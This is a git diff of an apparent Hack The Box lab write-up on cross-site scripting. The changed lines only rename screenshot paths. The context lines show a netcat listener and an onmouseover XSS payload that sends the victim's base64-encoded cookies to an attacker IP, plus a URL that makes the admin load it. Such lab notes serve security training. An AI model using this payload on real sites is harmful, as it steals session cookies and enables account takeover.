@@ -62,9 +62,9 @@ Now, sen the url profile share to admin -->
 
 `http://minilab.htb.net/submit-solution?url=http://10.10.15.232:1234`
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 It found... more o less... so... try with netcat -->
 
@@ -76,13 +76,13 @@ sudo nc -nlvp 666
 <h1 onmouseover='document.write(`<img src="http://10.10.15.232:666?cookie=${btoa(document.cookie)}">`)'>test</h1>
 ```
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 NICE! now, send it to the admin -->
 
 `http://minilab.htb.net/submit-solution?url=http://10.10.15.232:666`
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 `http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com`
 
